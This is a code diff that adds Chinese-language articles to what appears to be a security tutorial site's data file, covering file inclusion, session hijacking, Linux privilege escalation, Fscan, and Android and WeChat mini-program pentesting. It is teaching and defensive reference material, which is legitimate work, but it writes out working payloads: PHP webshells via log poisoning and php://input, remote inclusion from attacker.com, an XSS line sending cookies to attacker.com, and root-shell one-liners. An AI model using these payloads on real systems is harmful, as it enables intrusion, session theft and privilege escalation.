@@ -29,9 +29,11 @@ export const categories = [
       { id: 'sqli', name: 'SQL 注入' },
       { id: 'xss', name: 'XSS 跨站脚本' },
       { id: 'upload', name: '文件上传漏洞' },
+      { id: 'lfi', name: '文件包含漏洞' },
       { id: 'rce', name: '命令执行漏洞' },
       { id: 'csrf', name: 'CSRF 请求伪造' },
       { id: 'xxe', name: 'XXE 注入' },
+      { id: 'session-hijack', name: '会话劫持与固定' },
     ]
   },
   {
@@ -8866,6 +8868,656 @@ yafu "factor(n)"
 2. 分析弱点
 3. 编写攻击脚本
 4. 解密获取 flag
+    `
+  },
+  // Web安全 - 补充
+  {
+    slug: 'lfi-rfi',
+    title: '文件包含漏洞（LFI/RFI）',
+    date: '2026-06-19',
+    category: 'websec',
+    subcategory: 'lfi',
+    tags: ['Web安全', '文件包含', 'LFI', 'RFI'],
+    summary: '本地文件包含和远程文件包含漏洞原理与利用。',
+    content: `
+## 什么是文件包含
+
+文件包含是应用程序将用户可控的文件名包含到代码中执行，导致恶意文件被加载执行。
+
+## LFI（本地文件包含）
+
+### 基础利用
+
+\`\`\`
+?file=../../../../etc/passwd
+?file=../../../../etc/passwd%00    # 空字节截断（PHP<5.3.4）
+\`\`\`
+
+### 常见路径
+
+\`\`\`
+# Linux
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/proc/self/fd/[0-10]
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+
+# Windows
+C:\\Windows\\win.ini
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\Windows\\repair\\sam
+\`\`\`
+
+### 读取日志实现RCE
+
+\`\`\`
+# 1. User-Agent 注入 PHP 代码
+curl -A "<?php system($_GET['cmd']); ?>" http://target/?page=/var/log/apache2/access.log
+
+# 2. 包含日志执行命令
+?file=/var/log/apache2/access.log&cmd=whoami
+\`\`\`
+
+### PHP 伪协议
+
+\`\`\`
+# 读取源码
+?page=php://filter/read=convert.base64-encode/resource=index.php
+
+# 写入文件
+?page=php://input
+POST: <?php system('id'); ?>
+
+# data 协议
+?page=data://text/plain,<?php system('id'); ?>
+\`\`\`
+
+## RFI（远程文件包含）
+
+\`\`\`
+?page=http://attacker.com/shell.txt
+?page=http://attacker.com/shell.txt%00
+\`\`\`
+
+### allow_url_include 开启时
+
+\`\`\`
+?page=php://input
+POST: <?php include 'http://attacker.com/shell.php'; ?>
+\`\`\`
+
+## 竞争条件包含
+
+\`\`\`
+# 上传文件的同时包含
+# 利用时间窗口执行恶意代码
+\`\`\`
+
+## 防御方案
+
+1. 禁止用户控制文件包含路径
+2. 设置 allow_url_include = Off
+3. 使用白名单限制可包含文件
+4. 关闭危险 PHP 伪协议
+    `
+  },
+  {
+    slug: 'session-hijack',
+    title: '会话劫持与会话固定',
+    date: '2026-06-18',
+    category: 'websec',
+    subcategory: 'session-hijack',
+    tags: ['Web安全', '会话劫持', '会话固定', 'Cookie'],
+    summary: '会话劫持和会话固定漏洞原理与防御。',
+    content: `
+## 会话机制
+
+### Session 工作流程
+
+\`\`\`
+1. 用户登录 → 服务端创建 Session
+2. 返回 SessionID 给浏览器（Cookie）
+3. 浏览器携带 SessionID 发起请求
+4. 服务端验证 SessionID
+\`\`\`
+
+## 会话劫持
+
+### 窃取 SessionID
+
+\`\`\`
+# XSS 窃取 Cookie
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+# 网络嗅探（HTTP明文）
+# 使用 Wireshark 抓取 Cookie
+
+# 中间人攻击
+# SSL 剥离
+\`\`\`
+
+### Session 固定
+
+\`\`\`
+# 攻击流程
+1. 攻击者获取一个合法 SessionID
+2. 诱导受害者使用该 SessionID 登录
+3. 受害者登录后，攻击者使用相同 SessionID 访问
+
+# 示例
+https://target.com/login?session=abc123
+\`\`\`
+
+### 窃取本地 Session 文件
+
+\`\`\`
+# PHP Session 存储位置
+/var/lib/php/sessions/sess_xxxxx
+
+# 文件包含读取
+?page=/var/lib/php/sessions/sess_abc123
+\`\`\`
+
+## 防御方案
+
+1. **HttpOnly Cookie**：防止 JavaScript 读取
+2. **Secure Flag**：仅 HTTPS 传输
+3. **Session 轮换**：登录后重新生成 SessionID
+4. **会话超时**：设置合理的过期时间
+5. **IP 绑定**：Session 与 IP 绑定
+6. **SameSite 属性**：限制跨站请求
+    `
+  },
+  // 攻防对抗 - 补充
+  {
+    slug: 'linux-privesc',
+    title: 'Linux 权限提升',
+    date: '2026-06-16',
+    category: 'attack-defense',
+    subcategory: 'privesc',
+    tags: ['渗透测试', '权限提升', 'Linux'],
+    summary: 'Linux 环境下的常见提权方法和工具。',
+    content: `
+## 提权方法
+
+### 1. SUID 提权
+
+\`\`\`bash
+# 查找SUID文件
+find / -perm -4000 2>/dev/null
+
+# 常见可提权SUID
+/usr/bin/find -exec /bin/sh \\;
+/usr/bin/vim -c ':!sh'
+/usr/bin/nmap --interactive
+\`\`\`
+
+### 2. 内核漏洞
+
+\`\`\`bash
+# 查看内核版本
+uname -r
+
+# 搜索可利用漏洞
+searchsploit linux kernel 4.x
+\`\`\`
+
+### 3. 计划任务
+
+\`\`\`bash
+# 查看可写的计划任务脚本
+cat /etc/crontab
+ls -la /etc/cron.*
+\`\`\`
+
+### 4. 密码相关
+
+\`\`\`bash
+# 查找敏感文件
+find / -name "*.conf" -o -name "*.cfg" 2>/dev/null
+cat /etc/shadow
+\`\`\`
+
+### 5. sudo 提权
+
+\`\`\`bash
+# 查看sudo权限
+sudo -l
+
+# 常见提权
+sudo vim -c ':!sh'
+sudo find / -exec /bin/sh \\;
+\`\`\`
+
+### 6. Capabilities
+
+\`\`\`bash
+# 查找capabilities
+getcap -r / 2>/dev/null
+
+# 利用
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+\`\`\`
+
+## 工具
+
+- **LinPEAS**：自动化提权检查
+- **linux-exploit-suggester**：漏洞搜索
+- **GTFOBins**：SUID/sudo 提权参考
+
+## 防御
+
+1. 及时更新内核
+2. 定期检查 SUID 文件
+3. 最小权限原则
+4. 监控异常进程
+    `
+  },
+  // 工具手册 - 补充 fscan
+  {
+    slug: 'fscan-guide',
+    title: 'Fscan 内网扫描工具',
+    date: '2026-06-14',
+    category: 'tools',
+    subcategory: 'fscan',
+    tags: ['工具', 'Fscan', '内网扫描'],
+    summary: 'Fscan 快速内网扫描和漏洞检测工具。',
+    content: `
+## Fscan 简介
+
+Fscan 是一款快速内网扫描工具，支持端口探测、服务识别、漏洞检测。
+
+## 基本用法
+
+\`\`\`bash
+# 快速扫描
+fscan -h 192.168.1.0/24
+
+# 指定端口
+fscan -h 192.168.1.0/24 -p 80,443,445,3389,6379,27017
+
+# 全端口扫描
+fscan -h 192.168.1.0/24 -p 1-65535
+\`\`\`
+
+## 常用参数
+
+| 参数 | 说明 |
+|------|------|
+| -h | 目标IP/CIDR |
+| -p | 指定端口 |
+| -o | 输出文件 |
+| -t | 线程数 |
+| -np | 不进行Ping探测 |
+| -c | 指定命令执行 |
+| -m | 扫描模式 |
+
+## 功能
+
+### 端口扫描
+\`\`\`bash
+fscan -h 192.168.1.100 -p 80,443,445
+\`\`\`
+
+### 服务识别
+自动识别 HTTP、SMB、SSH、RDP 等服务。
+
+### 漏洞检测
+\`\`\`bash
+# 检测常见漏洞
+fscan -h 192.168.1.0/24 -np -p 445
+
+# 检测 Weblogic
+fscan -h 192.168.1.0/24 -p 7001
+
+# 检测 Redis
+fscan -h 192.168.1.0/24 -p 6379
+\`\`\`
+
+### 域探测
+\`\`\`bash
+fscan -h 192.168.1.0/24 -dc 192.168.1.1
+\`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 第一轮：快速存活探测
+fscan -h 10.10.0.0/16 -np -p 80,443,445,3389,6379,27017,1433,3306 -o alive.txt
+
+# 第二轮：详细扫描
+fscan -h 10.10.1.0/24 -p 1-65535 -o full.txt
+
+# 第三轮：漏洞利用
+fscan -h 10.10.1.100 -p 445 -c "whoami"
+\`\`\`
+
+## 防御
+
+1. 限制内网访问
+2. 修改默认端口
+3. 强密码策略
+4. 防火墙规则
+    `
+  },
+  // 移动端安全 - 补充 APP渗透详细
+  {
+    slug: 'android-pentest-advanced',
+    title: 'APP 渗透测试实战',
+    date: '2026-06-12',
+    category: 'mobile',
+    subcategory: 'android-pentest',
+    tags: ['移动端安全', 'APP渗透', 'Frida'],
+    summary: 'APP 渗透测试完整流程：抓包、反编译、加固绕过。',
+    content: `
+## APK 敏感信息收集
+
+### apkleaks 快速扫描
+
+\`\`\`bash
+# 安装
+pip install apkleaks
+
+# 扫描APK
+python apkleaks.py -f target.apk
+# 可发现云主机key、服务器IP、API密钥等
+\`\`\`
+
+### 反编译分析
+
+\`\`\`bash
+# jadx 反编译
+jadx -d output/ target.apk
+
+# 检查 classes.dex 硬编码
+# 检查 SharedPreferences 配置
+# 检查 SQLite 数据库
+\`\`\`
+
+## APP 抓包
+
+### 代理设置
+
+\`\`\`
+1. BurpSuite 监听 127.0.0.1:8080
+2. 模拟器设置桥接模式
+3. 配置网络代理为 Burp 地址
+\`\`\`
+
+### 安装系统证书
+
+\`\`\`bash
+# 转为 PEM 格式
+openssl x509 -inform DER -in cacert.der -out cacert.pem
+
+# 重命名为 hash 值
+mv cacert.pem \`openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1\`.0'
+
+# 复制到系统证书目录
+\`\`\`
+
+## 加固绕过
+
+### Root 检测绕过
+
+\`\`\`bash
+# 使用 Magisk + Shamiko
+adb push Shamiko.zip /sdcard/Download/
+# 面具 → 模块 → 本地安装 → 刷入 → 重启
+# 面具设置 → 排除列表 → 添加目标 APP
+\`\`\`
+
+### 代理检测绕过
+
+\`\`\`bash
+# 使用 VPN 代理
+# https://github.com/ys1231/appproxy
+\`\`\`
+
+### SSL Pinning 绕过
+
+\`\`\`bash
+# 1. 查找设备架构
+adb shell getprop ro.product.cpu.abi
+
+# 2. 推送 frida-server
+adb push frida-server /data/local/tmp/
+adb shell chmod 777 /data/local/tmp/frida-server
+adb shell /data/local/tmp/frida-server &
+
+# 3. 列出进程
+frida-ps -U
+
+# 4. 注入脚本
+frida -U -f com.package.name --no-pause -l bypass.js
+\`\`\`
+
+### Frida 绕过脚本
+
+\`\`\`javascript
+// SSL Pinning Bypass
+Java.perform(function() {
+    var TrustManager = Java.registerClass({
+        name: "com.bypass.TrustManager",
+        implements: [Java.use("javax.net.ssl.X509TrustManager")],
+        methods: {
+            checkClientTrusted: function(chain, authType) {},
+            checkServerTrusted: function(chain, authType) {},
+            getAcceptedIssuers: function() { return []; }
+        }
+    });
+});
+\`\`\`
+
+## 安全测试清单
+
+1. 敏感信息收集
+2. 抓包分析接口
+3. 测试未授权访问
+4. 测试参数篡改
+5. 检查数据存储
+6. 测试 SSL Pinning
+    `
+  },
+  // 移动端安全 - 增强小程序
+  {
+    slug: 'miniapp-pentest-advanced',
+    title: '小程序渗透测试实战',
+    date: '2026-06-10',
+    category: 'mobile',
+    subcategory: 'miniapp-pentest',
+    tags: ['移动端安全', '小程序渗透', '微信'],
+    summary: '微信小程序渗透测试完整流程。',
+    content: `
+## PC 端小程序抓包
+
+### Proxifier + BurpSuite
+
+\`\`\`
+1. BurpSuite 监听 127.0.0.1:8080
+2. Proxifier 设置代理服务器
+3. 配置代理规则：WeChat → 代理
+\`\`\`
+
+## 反编译获取源码
+
+### 工具
+
+\`\`\`bash
+# unveilr
+unveilr target.wxapkg -o output/
+
+# wxappUnpacker
+wxappUnpacker target.wxapkg
+\`\`\`
+
+## 漏洞挖掘
+
+### 信息泄露
+
+\`\`\`
+# 搜索关键字
+apikey, secret, token, password, appid
+
+# 正则匹配
+# IP地址
+(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\. ...
+
+# 手机号码
+0?(13|14|15|17|18|19)[0-9]{9}
+
+# 邮箱
+\\w[-\\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+\\.)+[A-Za-z]{2,14}
+\`\`\`
+
+### 未授权访问
+
+\`\`\`
+# 测试所有接口
+GET /api/user/list
+POST /api/admin/delete
+
+# 无认证访问
+\`\`\`
+
+### Appid 和 Secret 利用
+
+\`\`\`bash
+# 获取 AccessToken
+curl "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=APPID&secret=SECRET"
+
+# 返回
+{"access_token":"xxx","expires_in":7200}
+
+# 后续利用
+# - 发送消息
+# - 获取用户信息
+\`\`\`
+
+### 破解 Sign 签名
+
+\`\`\`
+# 签名绕过思路
+1. 删除 sign 字段尝试
+2. 置空 sign 值尝试
+3. 反编译查找加密算法
+4. 使用相同算法构造 sign
+\`\`\`
+
+## 防御
+
+1. 不要硬编码密钥
+2. 接口添加鉴权
+3. 使用 HTTPS
+4. 签名校验
+    `
+  },
+  // 安全开发 - 补充 Git & Docker
+  {
+    slug: 'git-docker-guide',
+    title: 'Git & Docker 运维手册',
+    date: '2026-06-08',
+    category: 'securedev',
+    subcategory: 'devsecops',
+    tags: ['DevOps', 'Git', 'Docker', '运维'],
+    summary: 'Git 版本控制和 Docker 容器运维实用手册。',
+    content: `
+## Git 手册
+
+### 基本设置
+
+\`\`\`bash
+git config --list                      # 查看配置
+git config --global user.name "name"   # 配置用户名
+git config --global user.email "email" # 配置邮箱
+git init                                # 初始化
+git add .                               # 添加所有文件
+git commit -m "message"                 # 提交
+git status                              # 查看状态
+\`\`\`
+
+### 远程仓库
+
+\`\`\`bash
+# 添加远程仓库
+git remote add origin https://github.com/user/repo.git
+
+# 推送
+git push -u origin main
+
+# 拉取
+git pull
+\`\`\`
+
+### 分支管理
+
+\`\`\`bash
+git branch                  # 查看分支
+git branch feature          # 创建分支
+git checkout feature        # 切换分支
+git merge feature           # 合并分支
+git branch -d feature       # 删除分支
+\`\`\`
+
+## Docker 手册
+
+### 安装
+
+\`\`\`bash
+# CentOS
+yum install -y yum-utils
+yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
+yum install docker-ce docker-ce-cli containerd.io
+systemctl start docker
+systemctl enable docker
+\`\`\`
+
+### 镜像操作
+
+\`\`\`bash
+docker search ubuntu        # 搜索镜像
+docker pull ubuntu          # 拉取镜像
+docker images               # 查看镜像
+docker rmi -f id            # 删除镜像
+\`\`\`
+
+### 容器操作
+
+\`\`\`bash
+docker ps                   # 查看运行容器
+docker ps -a                # 查看所有容器
+docker exec -it id bash     # 进入容器
+docker logs id              # 查看日志
+docker stop id              # 停止容器
+docker rm id                # 删除容器
+\`\`\`
+
+### Dockerfile
+
+\`\`\`dockerfile
+FROM ubuntu:20.04
+WORKDIR /app
+COPY . .
+RUN apt-get update && apt-get install -y python3
+CMD ["python3", "app.py"]
+\`\`\`
+
+### docker-compose
+
+\`\`\`yaml
+version: '3'
+services:
+  web:
+    image: nginx:latest
+    ports:
+      - "80:80"
+  db:
+    image: mysql:8.0
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+\`\`\`
     `
   },
 ]
